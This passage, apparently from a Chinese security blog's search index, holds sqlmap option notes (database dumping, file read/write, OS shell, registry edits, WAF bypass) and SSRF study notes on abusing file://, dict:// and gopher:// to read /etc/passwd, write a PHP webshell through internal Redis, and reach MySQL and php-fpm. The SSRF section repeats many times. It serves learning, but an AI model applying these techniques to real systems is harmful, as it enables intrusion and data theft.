–peivileges-U xxx　-u 查询指定账号的权限 如果不跟指定用户名 则查询的是所有的用户, -CU 查询当前用户 -D 指定数据库 –table　查询所有表 -T 指定表 –columns　查询指定表的所有列 -C 指定某一列查询 –exclude-sysdbs　忽略系统库 –count　统计记录 –batch　批处理,也就是系统默认选项(按照默认的选项 全自动执行) ","date":"2023-11-17","objectID":"/sqlmap_common_commands/:11:0","series":null,"tags":["manual"],"title":"sqlmap常用命令","uri":"/sqlmap_common_commands/#enumeration枚举"},{"categories":["manual"],"content":"\rdump数据：　–dump　保存数据到本地(配合一系列的指令) -C　指定columns 如果不指定,默认整表 -T　指定表名, -D　指定数据库 -start　数据起始位置 (按表的id进行取值) -stop　数据结束位置 –dump-all　下载整表 –sql-query　指定sql语句 ","date":"2023-11-17","objectID":"/sqlmap_common_commands/:12:0","series":null,"tags":["manual"],"title":"sqlmap常用命令","uri":"/sqlmap_common_commands/#dump数据"},{"categories":["manual"],"content":"\rBrute Force(暴力破解)：　在mysql \u003c5.0的时候 ,是没有information_schema库的,这时候我们就不能根据数据源表进行一系列的操作 还有一种情况是mysql\u003e=5.0的时候,但无权限读取information_schema库,这时候可能就需要用到暴力破解 在微软access数据库中,默认是无权读取MSysObjects库的 –common-tables　暴力破解表名(根据字典) –common-columns(Access系统表无列信息)　暴力破解表字段 ","date":"2023-11-17","objectID":"/sqlmap_common_commands/:13:0","series":null,"tags":["manual"],"title":"sqlmap常用命令","uri":"/sqlmap_common_commands/#brute-force暴力破解"},{"categories":["manual"],"content":"\rUdf Injection(UDF注射)：　–udf-inject ,, –shared-lib –file-read　读取目标系统指定文件(值为具体文件的路径) –file-write　写入的文件 –file-dest　写入保存的路径 –os-cmd　执行系统命令 –os-shell　得到系统shell –sql-shell　得到sqlshell ","date":"2023-11-17","objectID":"/sqlmap_common_commands/:14:0","series":null,"tags":["manual"],"title":"sqlmap常用命令","uri":"/sqlmap_common_commands/#udf-injectionudf注射"},{"categories":["manual"],"content":"\rWindows RegisTory(Windows注册表相关)：　–reg-read　读取注册表键值 –reg-add　向注册表添加键值 –reg-del　删除注册表键值 –reg-key –reg-value –reg-data –reg-type 辅助参数, 上面三个操作的时候可以缩小范围. ","date":"2023-11-17","objectID":"/sqlmap_common_commands/:15:0","series":null,"tags":["manual"],"title":"sqlmap常用命令","uri":"/sqlmap_common_commands/#windows-registorywindows注册表相关"},{"categories":["manual"],"content":"\rGeneral(常规参数)：　-s　sqllite会话文件保存位置 -t　记录流量文件保存位置 –charset　强制字符编码 –crawl　从起始位置爬站深度 –csv-del　dump下来的数据默认存于\",“分割的csv文件中,–csv-del用来指定其他分隔符 –dbms-cred　指定数据库账号 –flush-session　清空session　–force-ssl　针对https的网站.. –fresh-queries　忽略本地session 从新发送请求 –output-dir　指定一个输出目录 –parse-errors　分析和显示数据库中内建报错信息 –save　将命令保存成配置文件 –check-waf　检测waf.ips.ids –hpp　绕过WAF,IPS,IDS 尤其对ASP,/IIS.ASP.NET/IIS –identify-waf　更彻底的检查waf ","date":"2023-11-17","objectID":"/sqlmap_common_commands/:16:0","series":null,"tags":["manual"],"title":"sqlmap常用命令","uri":"/sqlmap_common_commands/#general常规参数"},{"categories":["manual"],"content":"\rMiscellaneous(杂项)：　–mobile　模拟只能手机设备(实现方式只是替换对应的user-agent) –purge-output　清除output文件夹 –smart　当有大量检测目标时, 只选择基于错误的检测结果 –wizard　向导模式.　","date":"2023-11-17","objectID":"/sqlmap_common_commands/:17:0","series":null,"tags":["manual"],"title":"sqlmap常用命令","uri":"/sqlmap_common_commands/#miscellaneous杂项"},{"categories":["web","notes"],"content":"一点SSRF初学笔记 ","date":"2023-11-17","objectID":"/ssrf/:0:0","series":null,"tags":["web","notes"],"title":"SSRF","uri":"/ssrf/#"},{"categories":["web","notes"],"content":"\r0x1 概述SSRF(Server-Side Request Forgery，服务器端请求伪造) 是一种由攻击者构造请求，由服务端发起请求的一个安全漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统，因为服务器请求天然的可以穿越防火墙。漏洞形成的原因大多是因为服务端提供了从其他服务器应用获取数据的功能且没有对目标地址作正确的过滤和限制。 ","date":"2023-11-17","objectID":"/ssrf/:0:1","series":null,"tags":["web","notes"],"title":"SSRF","uri":"/ssrf/#0x1-概述"},{"categories":["web","notes"],"content":"\r0x2 原理**SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制。**比如从指定URL地址获取网页文本内容，加载指定地址的图片，文档等等。SSRF漏洞通过篡改获取资源的请求发送给服务器（服务器并没有检测这个请求是否合法的），然后服务器以他的身份来访问服务器的其他资源。SSRF利用存在缺陷的Web应用作为代理攻击远程和本地的服务器。 ","date":"2023-11-17","objectID":"/ssrf/:0:2","series":null,"tags":["web","notes"],"title":"SSRF","uri":"/ssrf/#0x2-原理"},{"categories":["web","notes"],"content":"\r0x3 函数和伪协议PHP中下面函数的使用不当会导致SSRF: file_get_contents() fsockopen() curl_exec() 伪协议 file://：从文件系统中获取文件内容，如，file:///etc/passwd dict://：字典服务器协议，访问字典资源，如，dict:///ip:6739/info gopher://：分布式文档传递服务，可使用gopherus生成payload。 ","date":"2023-11-17","objectID":"/ssrf/:0:3","series":null,"tags":["web","notes"],"title":"SSRF","uri":"/ssrf/#0x3-函数和伪协议"},{"categories":["web","notes"],"content":"\r0x4 SSRF怎么找能够对外发起网络请求的地方，就可能存在SSRF漏洞。 能够对外发起网络请求的地方 请求远程服务器资源的地方 数据库内置功能 邮件系统 文件处理 在线处理工具 ","date":"2023-11-17","objectID":"/ssrf/:0:4","series":null,"tags":["web","notes"],"title":"SSRF","uri":"/ssrf/#0x4-ssrf怎么找"},{"categories":["web","notes"],"content":"\r0x5 ssrf漏洞利用\r1任意文件读取file:// 通过file协议读取本地文件，但只能读取已知文件名的文件 2内网资源探测利用控制的host字段，来扫描内网存活主机 若服务器监听127.0.0.1则这个端口只能被本机访问，若监听0.0.0.0，则这个端口可以被外网访问 3gopher协议扩展攻击面gopher:// 负责转发 1攻击redis的6379端口Redis一般运行在内网，使用者大多将其绑定在127.0.0.1:6379地址，切且一般为空口令，攻击者可以通过SSRF访问内网的redis，由于redis支持通过url形式的访问，来增加、删除、保存内容，所以，攻击者就可以首先增加一个PHP一句话木马的内容到redis，然后备份其文件，就可以将一句话木马保存到硬盘中，实现恶意代码写入 rides是一条指令执行一个行为，如果其中一条指令是错的，会继续读取下一条指令继续执行，所以如果我们能够控制报文的任意一行，就可以将其修改为redis指令，分批执行命令完成攻击 2攻击MySQL的3306端口攻击内网中的MySQL，我们需要了解其通信协议，MySQL分为服务端和客户端 由客户端连接服务端有四种方式： 1.Unix套接字 2.内存共享 3.命名管道 4.TCP/IP套接字 我们的攻击依靠第四种方式，MySQL客户端连接时： 1.需要密码认证，此时，服务器先发送salt，客户端使用salt进行加密后再验证 2.不需要密码验证，将直接使用上面第四种方式发送数据包 所以，这里攻击MySQL，需要在非交互条件下进行，一定只能攻击没有密码的MySQL服务器 3攻击fastcgi的9000端口 php-fpm是个中间件，在需要PHP解释器来处理php文本时会用到php-fpm.自从PHP5.3以后将php-fpm继承到php内核中，php-fpm提供了更好的php进程管理方式，可以有效控制内存的进程，可以平滑重载php配置 以我们经常执行访问的index.php?file=/etc/passwd为例: 浏览器发送访问index.php的请求到web服务器,比如nginx/apache web服务器将请求的url(index.php),参数(file=/etc/passwd)等等发送给专门的php解释器来执行,因为nginx/apache是只能处理静态文件(通过文件读取的方式) , 对于动态的php脚本, 需要专门的php-fpm中间件来解释执行 php-fpm收到了web服务器传递过来的各种参数后, 初始化zend虚拟机, 对php文件做词法分析,语法分析,编译成opcode,并执行.最后关闭zend虚拟机.将执行结果返回给web服务器 web服务器收到返回结果后,将http相应传给浏览器 包含配置文件以后，后面紧跟一句 fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name 定义了一个SCRIPT_FILENAME,值是$document_root$fastcgi_script_name 重点看SCRIPT_FILENAME,这个就是nginx传给php-fpm的 nginx和php-fpm的数据交互,使用的是fast-cgi协议 fastcgi协议 fastcgi其实是一个通信协议,和http协议一样,都是进行数据交换的一个通道.http协议是浏览器和服务器中间件进行数据交换的协议,浏览器将http头和http体用某个规则组装成数据包,以tcp的方式发送到服务器中间件,服务器中间件按照规则将数据包解码,并按要求拿到用户需要的数据,再以http协议的规则打包返回给服务器. 可以使用伪造的fastcgi协议数据,与php-fpm交互,通过伪造script_filename的参数,来实现执行任意的PHP脚本文件 ssrf-\u003e控制服务端脚本请求本地php-fpm端口-\u003e伪造配置参数包含php://input数据-\u003e执行php://input内提交的代码 ","date":"2023-11-17","objectID":"/ssrf/:0:5","series":null,"tags":["web","notes"],"title":"SSRF","uri":"/ssrf/#0x5-ssrf漏洞利用"},{"categories":["web","notes"],"content":"\r0x5 ssrf漏洞利用\r1任意文件读取file:// 通过file协议读取本地文件，但只能读取已知文件名的文件 2内网资源探测利用控制的host字段，来扫描内网存活主机 若服务器监听127.0.0.1则这个端口只能被本机访问，若监听0.0.0.0，则这个端口可以被外网访问 3gopher协议扩展攻击面gopher:// 负责转发 1攻击redis的6379端口Redis一般运行在内网，使用者大多将其绑定在127.0.0.1:6379地址，切且一般为空口令，攻击者可以通过SSRF访问内网的redis，由于redis支持通过url形式的访问，来增加、删除、保存内容，所以，攻击者就可以首先增加一个PHP一句话木马的内容到redis，然后备份其文件，就可以将一句话木马保存到硬盘中，实现恶意代码写入 rides是一条指令执行一个行为，如果其中一条指令是错的，会继续读取下一条指令继续执行，所以如果我们能够控制报文的任意一行，就可以将其修改为redis指令，分批执行命令完成攻击 2攻击MySQL的3306端口攻击内网中的MySQL，我们需要了解其通信协议，MySQL分为服务端和客户端 由客户端连接服务端有四种方式： 1.Unix套接字 2.内存共享 3.命名管道 4.TCP/IP套接字 我们的攻击依靠第四种方式，MySQL客户端连接时： 1.需要密码认证，此时，服务器先发送salt，客户端使用salt进行加密后再验证 2.不需要密码验证，将直接使用上面第四种方式发送数据包 所以，这里攻击MySQL，需要在非交互条件下进行，一定只能攻击没有密码的MySQL服务器 3攻击fastcgi的9000端口 php-fpm是个中间件，在需要PHP解释器来处理php文本时会用到php-fpm.自从PHP5.3以后将php-fpm继承到php内核中，php-fpm提供了更好的php进程管理方式，可以有效控制内存的进程，可以平滑重载php配置 以我们经常执行访问的index.php?file=/etc/passwd为例: 浏览器发送访问index.php的请求到web服务器,比如nginx/apache web服务器将请求的url(index.php),参数(file=/etc/passwd)等等发送给专门的php解释器来执行,因为nginx/apache是只能处理静态文件(通过文件读取的方式) , 对于动态的php脚本, 需要专门的php-fpm中间件来解释执行 php-fpm收到了web服务器传递过来的各种参数后, 初始化zend虚拟机, 对php文件做词法分析,语法分析,编译成opcode,并执行.最后关闭zend虚拟机.将执行结果返回给web服务器 web服务器收到返回结果后,将http相应传给浏览器 包含配置文件以后，后面紧跟一句 fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name 定义了一个SCRIPT_FILENAME,值是$document_root$fastcgi_script_name 重点看SCRIPT_FILENAME,这个就是nginx传给php-fpm的 nginx和php-fpm的数据交互,使用的是fast-cgi协议 fastcgi协议 fastcgi其实是一个通信协议,和http协议一样,都是进行数据交换的一个通道.http协议是浏览器和服务器中间件进行数据交换的协议,浏览器将http头和http体用某个规则组装成数据包,以tcp的方式发送到服务器中间件,服务器中间件按照规则将数据包解码,并按要求拿到用户需要的数据,再以http协议的规则打包返回给服务器. 可以使用伪造的fastcgi协议数据,与php-fpm交互,通过伪造script_filename的参数,来实现执行任意的PHP脚本文件 ssrf-\u003e控制服务端脚本请求本地php-fpm端口-\u003e伪造配置参数包含php://input数据-\u003e执行php://input内提交的代码 ","date":"2023-11-17","objectID":"/ssrf/:0:5","series":null,"tags":["web","notes"],"title":"SSRF","uri":"/ssrf/#1任意文件读取"},{"categories":["web","notes"],"content":"\r0x5 ssrf漏洞利用\r1任意文件读取file:// 通过file协议读取本地文件，但只能读取已知文件名的文件 2内网资源探测利用控制的host字段，来扫描内网存活主机 若服务器监听127.0.0.1则这个端口只能被本机访问，若监听0.0.0.0，则这个端口可以被外网访问 3gopher协议扩展攻击面gopher:// 负责转发 1攻击redis的6379端口Redis一般运行在内网，使用者大多将其绑定在127.0.0.1:6379地址，切且一般为空口令，攻击者可以通过SSRF访问内网的redis，由于redis支持通过url形式的访问，来增加、删除、保存内容，所以，攻击者就可以首先增加一个PHP一句话木马的内容到redis，然后备份其文件，就可以将一句话木马保存到硬盘中，实现恶意代码写入 rides是一条指令执行一个行为，如果其中一条指令是错的，会继续读取下一条指令继续执行，所以如果我们能够控制报文的任意一行，就可以将其修改为redis指令，分批执行命令完成攻击 2攻击MySQL的3306端口攻击内网中的MySQL，我们需要了解其通信协议，MySQL分为服务端和客户端 由客户端连接服务端有四种方式： 1.Unix套接字 2.内存共享 3.命名管道 4.TCP/IP套接字 我们的攻击依靠第四种方式，MySQL客户端连接时： 1.需要密码认证，此时，服务器先发送salt，客户端使用salt进行加密后再验证 2.不需要密码验证，将直接使用上面第四种方式发送数据包 所以，这里攻击MySQL，需要在非交互条件下进行，一定只能攻击没有密码的MySQL服务器 3攻击fastcgi的9000端口 php-fpm是个中间件，在需要PHP解释器来处理php文本时会用到php-fpm.自从PHP5.3以后将php-fpm继承到php内核中，php-fpm提供了更好的php进程管理方式，可以有效控制内存的进程，可以平滑重载php配置 以我们经常执行访问的index.php?file=/etc/passwd为例: 浏览器发送访问index.php的请求到web服务器,比如nginx/apache web服务器将请求的url(index.php),参数(file=/etc/passwd)等等发送给专门的php解释器来执行,因为nginx/apache是只能处理静态文件(通过文件读取的方式) , 对于动态的php脚本, 需要专门的php-fpm中间件来解释执行 php-fpm收到了web服务器传递过来的各种参数后, 初始化zend虚拟机, 对php文件做词法分析,语法分析,编译成opcode,并执行.最后关闭zend虚拟机.将执行结果返回给web服务器 web服务器收到返回结果后,将http相应传给浏览器 包含配置文件以后，后面紧跟一句 fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name 定义了一个SCRIPT_FILENAME,值是$document_root$fastcgi_script_name 重点看SCRIPT_FILENAME,这个就是nginx传给php-fpm的 nginx和php-fpm的数据交互,使用的是fast-cgi协议 fastcgi协议 fastcgi其实是一个通信协议,和http协议一样,都是进行数据交换的一个通道.http协议是浏览器和服务器中间件进行数据交换的协议,浏览器将http头和http体用某个规则组装成数据包,以tcp的方式发送到服务器中间件,服务器中间件按照规则将数据包解码,并按要求拿到用户需要的数据,再以http协议的规则打包返回给服务器. 可以使用伪造的fastcgi协议数据,与php-fpm交互,通过伪造script_filename的参数,来实现执行任意的PHP脚本文件 ssrf-\u003e控制服务端脚本请求本地php-fpm端口-\u003e伪造配置参数包含php://input数据-\u003e执行php://input内提交的代码 ","date":"2023-11-17","objectID":"/ssrf/:0:5","series":null,"tags":["web","notes"],"title":"SSRF","uri":"/ssrf/#2内网资源探测"},{"categories":["web","notes"],"content":"\r0x5 ssrf漏洞利用\r1任意文件读取file:// 通过file协议读取本地文件，但只能读取已知文件名的文件 2内网资源探测利用控制的host字段，来扫描内网存活主机 若服务器监听127.0.0.1则这个端口只能被本机访问，若监听0.0.0.0，则这个端口可以被外网访问 3gopher协议扩展攻击面gopher:// 负责转发 1攻击redis的6379端口Redis一般运行在内网，使用者大多将其绑定在127.0.0.1:6379地址，切且一般为空口令，攻击者可以通过SSRF访问内网的redis，由于redis支持通过url形式的访问，来增加、删除、保存内容，所以，攻击者就可以首先增加一个PHP一句话木马的内容到redis，然后备份其文件，就可以将一句话木马保存到硬盘中，实现恶意代码写入 rides是一条指令执行一个行为，如果其中一条指令是错的，会继续读取下一条指令继续执行，所以如果我们能够控制报文的任意一行，就可以将其修改为redis指令，分批执行命令完成攻击 2攻击MySQL的3306端口攻击内网中的MySQL，我们需要了解其通信协议，MySQL分为服务端和客户端 由客户端连接服务端有四种方式： 1.Unix套接字 2.内存共享 3.命名管道 4.TCP/IP套接字 我们的攻击依靠第四种方式，MySQL客户端连接时： 1.需要密码认证，此时，服务器先发送salt，客户端使用salt进行加密后再验证 2.不需要密码验证，将直接使用上面第四种方式发送数据包 所以，这里攻击MySQL，需要在非交互条件下进行，一定只能攻击没有密码的MySQL服务器 3攻击fastcgi的9000端口 php-fpm是个中间件，在需要PHP解释器来处理php文本时会用到php-fpm.自从PHP5.3以后将php-fpm继承到php内核中，php-fpm提供了更好的php进程管理方式，可以有效控制内存的进程，可以平滑重载php配置 以我们经常执行访问的index.php?file=/etc/passwd为例: 浏览器发送访问index.php的请求到web服务器,比如nginx/apache web服务器将请求的url(index.php),参数(file=/etc/passwd)等等发送给专门的php解释器来执行,因为nginx/apache是只能处理静态文件(通过文件读取的方式) , 对于动态的php脚本, 需要专门的php-fpm中间件来解释执行 php-fpm收到了web服务器传递过来的各种参数后, 初始化zend虚拟机, 对php文件做词法分析,语法分析,编译成opcode,并执行.最后关闭zend虚拟机.将执行结果返回给web服务器 web服务器收到返回结果后,将http相应传给浏览器 包含配置文件以后，后面紧跟一句 fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name 定义了一个SCRIPT_FILENAME,值是$document_root$fastcgi_script_name 重点看SCRIPT_FILENAME,这个就是nginx传给php-fpm的 nginx和php-fpm的数据交互,使用的是fast-cgi协议 fastcgi协议 fastcgi其实是一个通信协议,和http协议一样,都是进行数据交换的一个通道.http协议是浏览器和服务器中间件进行数据交换的协议,浏览器将http头和http体用某个规则组装成数据包,以tcp的方式发送到服务器中间件,服务器中间件按照规则将数据包解码,并按要求拿到用户需要的数据,再以http协议的规则打包返回给服务器. 可以使用伪造的fastcgi协议数据,与php-fpm交互,通过伪造script_filename的参数,来实现执行任意的PHP脚本文件 ssrf-\u003e控制服务端脚本请求本地php-fpm端口-\u003e伪造配置参数包含php://input数据-\u003e执行php://input内提交的代码 ","date":"2023-11-17","objectID":"/ssrf/:0:5","series":null,"tags":["web","notes"],"title":"SSRF","uri":"/ssrf/#3gopher协议扩展攻击面"},{"categories":["web","notes"],"content":"\r0x5 ssrf漏洞利用\r1任意文件读取file:// 通过file协议读取本地文件，但只能读取已知文件名的文件 2内网资源探测利用控制的host字段，来扫描内网存活主机 若服务器监听127.0.0.1则这个端口只能被本机访问，若监听0.0.0.0，则这个端口可以被外网访问 3gopher协议扩展攻击面gopher:// 负责转发 1攻击redis的6379端口Redis一般运行在内网，使用者大多将其绑定在127.0.0.1:6379地址，切且一般为空口令，攻击者可以通过SSRF访问内网的redis，由于redis支持通过url形式的访问，来增加、删除、保存内容，所以，攻击者就可以首先增加一个PHP一句话木马的内容到redis，然后备份其文件，就可以将一句话木马保存到硬盘中，实现恶意代码写入 rides是一条指令执行一个行为，如果其中一条指令是错的，会继续读取下一条指令继续执行，所以如果我们能够控制报文的任意一行，就可以将其修改为redis指令，分批执行命令完成攻击 2攻击MySQL的3306端口攻击内网中的MySQL，我们需要了解其通信协议，MySQL分为服务端和客户端 由客户端连接服务端有四种方式： 1.Unix套接字 2.内存共享 3.命名管道 4.TCP/IP套接字 我们的攻击依靠第四种方式，MySQL客户端连接时： 1.需要密码认证，此时，服务器先发送salt，客户端使用salt进行加密后再验证 2.不需要密码验证，将直接使用上面第四种方式发送数据包 所以，这里攻击MySQL，需要在非交互条件下进行，一定只能攻击没有密码的MySQL服务器 3攻击fastcgi的9000端口 php-fpm是个中间件，在需要PHP解释器来处理php文本时会用到php-fpm.自从PHP5.3以后将php-fpm继承到php内核中，php-fpm提供了更好的php进程管理方式，可以有效控制内存的进程，可以平滑重载php配置 以我们经常执行访问的index.php?file=/etc/passwd为例: 浏览器发送访问index.php的请求到web服务器,比如nginx/apache web服务器将请求的url(index.php),参数(file=/etc/passwd)等等发送给专门的php解释器来执行,因为nginx/apache是只能处理静态文件(通过文件读取的方式) , 对于动态的php脚本, 需要专门的php-fpm中间件来解释执行 php-fpm收到了web服务器传递过来的各种参数后, 初始化zend虚拟机, 对php文件做词法分析,语法分析,编译成opcode,并执行.最后关闭zend虚拟机.将执行结果返回给web服务器 web服务器收到返回结果后,将http相应传给浏览器 包含配置文件以后，后面紧跟一句 fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name 定义了一个SCRIPT_FILENAME,值是$document_root$fastcgi_script_name 重点看SCRIPT_FILENAME,这个就是nginx传给php-fpm的 nginx和php-fpm的数据交互,使用的是fast-cgi协议 fastcgi协议 fastcgi其实是一个通信协议,和http协议一样,都是进行数据交换的一个通道.http协议是浏览器和服务器中间件进行数据交换的协议,浏览器将http头和http体用某个规则组装成数据包,以tcp的方式发送到服务器中间件,服务器中间件按照规则将数据包解码,并按要求拿到用户需要的数据,再以http协议的规则打包返回给服务器. 可以使用伪造的fastcgi协议数据,与php-fpm交互,通过伪造script_filename的参数,来实现执行任意的PHP脚本文件 ssrf-\u003e控制服务端脚本请求本地php-fpm端口-\u003e伪造配置参数包含php://input数据-\u003e执行php://input内提交的代码 ","date":"2023-11-17","objectID":"/ssrf/:0:5","series":null,"tags":["web","notes"],"title":"SSRF","uri":"/ssrf/#1攻击redis的6379端口"},{"categories":["web","notes"],"content":"\r0x5 ssrf漏洞利用\r1任意文件读取file:// 通过file协议读取本地文件，但只能读取已知文件名的文件 2内网资源探测利用控制的host字段，来扫描内网存活主机 若服务器监听127.0.0.1则这个端口只能被本机访问，若监听0.0.0.0，则这个端口可以被外网访问 3gopher协议扩展攻击面gopher:// 负责转发 1攻击redis的6379端口Redis一般运行在内网，使用者大多将其绑定在127.0.0.1:6379地址，切且一般为空口令，攻击者可以通过SSRF访问内网的redis，由于redis支持通过url形式的访问，来增加、删除、保存内容，所以，攻击者就可以首先增加一个PHP一句话木马的内容到redis，然后备份其文件，就可以将一句话木马保存到硬盘中，实现恶意代码写入 rides是一条指令执行一个行为，如果其中一条指令是错的，会继续读取下一条指令继续执行，所以如果我们能够控制报文的任意一行，就可以将其修改为redis指令，分批执行命令完成攻击 2攻击MySQL的3306端口攻击内网中的MySQL，我们需要了解其通信协议，MySQL分为服务端和客户端 由客户端连接服务端有四种方式： 1.Unix套接字 2.内存共享 3.命名管道 4.TCP/IP套接字 我们的攻击依靠第四种方式，MySQL客户端连接时： 1.需要密码认证，此时，服务器先发送salt，客户端使用salt进行加密后再验证 2.不需要密码验证，将直接使用上面第四种方式发送数据包 所以，这里攻击MySQL，需要在非交互条件下进行，一定只能攻击没有密码的MySQL服务器 3攻击fastcgi的9000端口 php-fpm是个中间件，在需要PHP解释器来处理php文本时会用到php-fpm.自从PHP5.3以后将php-fpm继承到php内核中，php-fpm提供了更好的php进程管理方式，可以有效控制内存的进程，可以平滑重载php配置 以我们经常执行访问的index.php?file=/etc/passwd为例: 浏览器发送访问index.php的请求到web服务器,比如nginx/apache web服务器将请求的url(index.php),参数(file=/etc/passwd)等等发送给专门的php解释器来执行,因为nginx/apache是只能处理静态文件(通过文件读取的方式) , 对于动态的php脚本, 需要专门的php-fpm中间件来解释执行 php-fpm收到了web服务器传递过来的各种参数后, 初始化zend虚拟机, 对php文件做词法分析,语法分析,编译成opcode,并执行.最后关闭zend虚拟机.将执行结果返回给web服务器 web服务器收到返回结果后,将http相应传给浏览器 包含配置文件以后，后面紧跟一句 fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name 定义了一个SCRIPT_FILENAME,值是$document_root$fastcgi_script_name 重点看SCRIPT_FILENAME,这个就是nginx传给php-fpm的 nginx和php-fpm的数据交互,使用的是fast-cgi协议 fastcgi协议 fastcgi其实是一个通信协议,和http协议一样,都是进行数据交换的一个通道.http协议是浏览器和服务器中间件进行数据交换的协议,浏览器将http头和http体用某个规则组装成数据包,以tcp的方式发送到服务器中间件,服务器中间件按照规则将数据包解码,并按要求拿到用户需要的数据,再以http协议的规则打包返回给服务器. 可以使用伪造的fastcgi协议数据,与php-fpm交互,通过伪造script_filename的参数,来实现执行任意的PHP脚本文件 ssrf-\u003e控制服务端脚本请求本地php-fpm端口-\u003e伪造配置参数包含php://input数据-\u003e执行php://input内提交的代码 ","date":"2023-11-17","objectID":"/ssrf/:0:5","series":null,"tags":["web","notes"],"title":"SSRF","uri":"/ssrf/#2攻击mysql的3306端口"},{"categories":["web","notes"],"content":"\r0x5 ssrf漏洞利用\r1任意文件读取file:// 通过file协议读取本地文件，但只能读取已知文件名的文件 2内网资源探测利用控制的host字段，来扫描内网存活主机 若服务器监听127.0.0.1则这个端口只能被本机访问，若监听0.0.0.0，则这个端口可以被外网访问 3gopher协议扩展攻击面gopher:// 负责转发 1攻击redis的6379端口Redis一般运行在内网，使用者大多将其绑定在127.0.0.1:6379地址，切且一般为空口令，攻击者可以通过SSRF访问内网的redis，由于redis支持通过url形式的访问，来增加、删除、保存内容，所以，攻击者就可以首先增加一个PHP一句话木马的内容到redis，然后备份其文件，就可以将一句话木马保存到硬盘中，实现恶意代码写入 rides是一条指令执行一个行为，如果其中一条指令是错的，会继续读取下一条指令继续执行，所以如果我们能够控制报文的任意一行，就可以将其修改为redis指令，分批执行命令完成攻击 2攻击MySQL的3306端口攻击内网中的MySQL，我们需要了解其通信协议，MySQL分为服务端和客户端 由客户端连接服务端有四种方式： 1.Unix套接字 2.内存共享 3.命名管道 4.TCP/IP套接字 我们的攻击依靠第四种方式，MySQL客户端连接时： 1.需要密码认证，此时，服务器先发送salt，客户端使用salt进行加密后再验证 2.不需要密码验证，将直接使用上面第四种方式发送数据包 所以，这里攻击MySQL，需要在非交互条件下进行，一定只能攻击没有密码的MySQL服务器 3攻击fastcgi的9000端口 php-fpm是个中间件，在需要PHP解释器来处理php文本时会用到php-fpm.自从PHP5.3以后将php-fpm继承到php内核中，php-fpm提供了更好的php进程管理方式，可以有效控制内存的进程，可以平滑重载php配置 以我们经常执行访问的index.php?file=/etc/passwd为例: 浏览器发送访问index.php的请求到web服务器,比如nginx/apache web服务器将请求的url(index.php),参数(file=/etc/passwd)等等发送给专门的php解释器来执行,因为nginx/apache是只能处理静态文件(通过文件读取的方式) , 对于动态的php脚本, 需要专门的php-fpm中间件来解释执行 php-fpm收到了web服务器传递过来的各种参数后, 初始化zend虚拟机, 对php文件做词法分析,语法分析,编译成opcode,并执行.最后关闭zend虚拟机.将执行结果返回给web服务器 web服务器收到返回结果后,将http相应传给浏览器 包含配置文件以后，后面紧跟一句 fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name 定义了一个SCRIPT_FILENAME,值是$document_root$fastcgi_script_name 重点看SCRIPT_FILENAME,这个就是nginx传给php-fpm的 nginx和php-fpm的数据交互,使用的是fast-cgi协议 fastcgi协议 fastcgi其实是一个通信协议,和http协议一样,都是进行数据交换的一个通道.http协议是浏览器和服务器中间件进行数据交换的协议,浏览器将http头和http体用某个规则组装成数据包,以tcp的方式发送到服务器中间件,服务器中间件按照规则将数据包解码,并按要求拿到用户需要的数据,再以http协议的规则打包返回给服务器. 可以使用伪造的fastcgi协议数据,与php-fpm交互,通过伪造script_filename的参数,来实现执行任意的PHP脚本文件 ssrf-\u003e控制服务端脚本请求本地php-fpm端口-\u003e伪造配置参数包含php://input数据-\u003e执行php://input内提交的代码 ","date":"2023-11-17","objectID":"/ssrf/:0:5","series":null,"tags":["web","notes"],"title":"SSRF","uri":"/ssrf/#3攻击fastcgi的9000端口"},{"categories":["web","notes"],"content":"\r0x5 ssrf漏洞利用\r1任意文件读取file:// 通过file协议读取本地文件，但只能读取已知文件名的文件 2内网资源探测利用控制的host字段，来扫描内网存活主机 若服务器监听127.0.0.1则这个端口只能被本机访问，若监听0.0.0.0，则这个端口可以被外网访问 3gopher协议扩展攻击面gopher:// 负责转发 1攻击redis的6379端口Redis一般运行在内网，使用者大多将其绑定在127.0.0.1:6379地址，切且一般为空口令，攻击者可以通过SSRF访问内网的redis，由于redis支持通过url形式的访问，来增加、删除、保存内容，所以，攻击者就可以首先增加一个PHP一句话木马的内容到redis，然后备份其文件，就可以将一句话木马保存到硬盘中，实现恶意代码写入 rides是一条指令执行一个行为，如果其中一条指令是错的，会继续读取下一条指令继续执行，所以如果我们能够控制报文的任意一行，就可以将其修改为redis指令，分批执行命令完成攻击 2攻击MySQL的3306端口攻击内网中的MySQL，我们需要了解其通信协议，MySQL分为服务端和客户端 由客户端连接服务端有四种方式： 1.Unix套接字 2.内存共享 3.命名管道 4.TCP/IP套接字 我们的攻击依靠第四种方式，MySQL客户端连接时： 1.需要密码认证，此时，服务器先发送salt，客户端使用salt进行加密后再验证 2.不需要密码验证，将直接使用上面第四种方式发送数据包 所以，这里攻击MySQL，需要在非交互条件下进行，一定只能攻击没有密码的MySQL服务器 3攻击fastcgi的9000端口 php-fpm是个中间件，在需要PHP解释器来处理php文本时会用到php-fpm.自从PHP5.3以后将php-fpm继承到php内核中，php-fpm提供了更好的php进程管理方式，可以有效控制内存的进程，可以平滑重载php配置 以我们经常执行访问的index.php?file=/etc/passwd为例: 浏览器发送访问index.php的请求到web服务器,比如nginx/apache web服务器将请求的url(index.php),参数(file=/etc/passwd)等等发送给专门的php解释器来执行,因为nginx/apache是只能处理静态文件(通过文件读取的方式) , 对于动态的php脚本, 需要专门的php-fpm中间件来解释执行 php-fpm收到了web服务器传递过来的各种参数后, 初始化zend虚拟机, 对php文件做词法分析,语法分析,编译成opcode,并执行.最后关闭zend虚拟机.将执行结果返回给web服务器 web服务器收到返回结果后,将http相应传给浏览器 包含配置文件以后，后面紧跟一句 fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name 定义了一个SCRIPT_FILENAME,值是$document_root$fastcgi_script_name 重点看SCRIPT_FILENAME,这个就是nginx传给php-fpm的 nginx和php-fpm的数据交互,使用的是fast-cgi协议 fastcgi协议 